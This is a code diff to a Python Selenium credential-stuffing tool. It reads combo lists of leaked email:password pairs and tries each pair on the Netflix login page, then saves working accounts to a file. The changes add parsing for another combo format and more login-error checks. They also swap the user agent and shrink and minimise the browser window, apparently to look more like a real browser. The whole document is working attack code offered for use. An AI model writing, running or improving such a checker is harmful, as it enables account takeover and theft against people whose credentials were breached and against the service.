@@ -12,7 +12,7 @@ from selenium.webdriver.common.by import By
 current_split_method = determine_split_method()
 
 def print_ip_and_country():
-	if current_split_method != "None" and current_split_method != ";":
+	if current_split_method != "None" and current_split_method != ";" and current_split_method != " |":
 		print("\n\033[38;5;7mCurrent IP: {} : {} | Fetching {} accounts\n".format(details[0], details[1], details[2]))
 	else:
 		print("\n\033[38;5;7mCurrent IP: {} : {} | No Countries in Combo\n".format(details[0], details[1]))
@@ -46,6 +46,9 @@ for file_ in range(len(files)):
 				if details[2] in line and current_split_method != ";":
 					user.append(line.split(":")[0])
 					passw.append(line.split(":")[1].split(current_split_method)[0].strip())
+				elif current_split_method == " |":
+					user.append(line.split(":")[0])
+					passw.append(line.split(":")[1].split(current_split_method)[0].strip())
 				elif current_split_method == ";":
 					user.append(line.split(";")[1].split(";")[0])
 					passw.append(line.split(";")[2].strip())
@@ -55,7 +58,6 @@ for file_ in range(len(files)):
 			for line in range(len(user)):	
 				updated_list.append("{}:{}\n".format(user[line], passw[line].strip()))
 		net.close()
-
 print_ip_and_country()
 page = "https://www.netflix.com/login"
 
@@ -65,11 +67,12 @@ while counter < len(user):
 
 		#Account Checker
 		browser_options = Options()
-		browser_options.add_argument ={'user-agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36'}
-		browser_options.headless = True
+		browser_options.add_argument('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36')
+		browser_options.headless = False
 		browser = webdriver.Chrome(options = browser_options)
-		browser.set_window_size(300,400)
-		browser.get(page)		
+		browser.set_window_size(10,10)		
+		browser.get(page)
+		browser.minimize_window()		
 		time.sleep(0.4)
 		login = browser.find_element(By.XPATH, '//*[@id="id_userLoginId"]')
 		password = browser.find_element(By.XPATH, '//*[@id="id_password"]')
@@ -84,13 +87,16 @@ while counter < len(user):
 			login_error = browser.find_element(By.XPATH, '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]').text
 			if "Sorry, we can't find an account with this email address." in login_error:
 				print("\033[38;5;196m Invalid Email",end='')
-
+			if "Sorry, we can't find an account with this number." in login_error:			
+				print("\033[38;5;196m Invalid Number",end='')
+			if "We are having technical difficulties and are actively working on a fix" in login_error:
+				print("\033[38;5;196m General Login Error",end='')
 			if "Incorrect password" in login_error:
 				print("\033[38;5;196m Invalid Password",end='')
-
+		if browser.find_elements(By.XPATH, '//*[@id="appMountPoint"]/div/div/div[2]/div/div[2]/button'):
+			print("\033[38;5;196m Incomplete Sign Up",end='')
 		if browser.find_elements(By.XPATH, '//*[@id="formstart"]/button/span[1]'):
 			print("\033[38;5;196m Account Cancelled",end='')
-
 		if browser.find_elements(By.XPATH, '//*[@id="appMountPoint"]/div/div/div[1]/div[1]/div[2]/div/div/h1'):
 			print("\033[38;5;46m Valid Account - Stored",end='')
 			with open('valid','a') as valid:
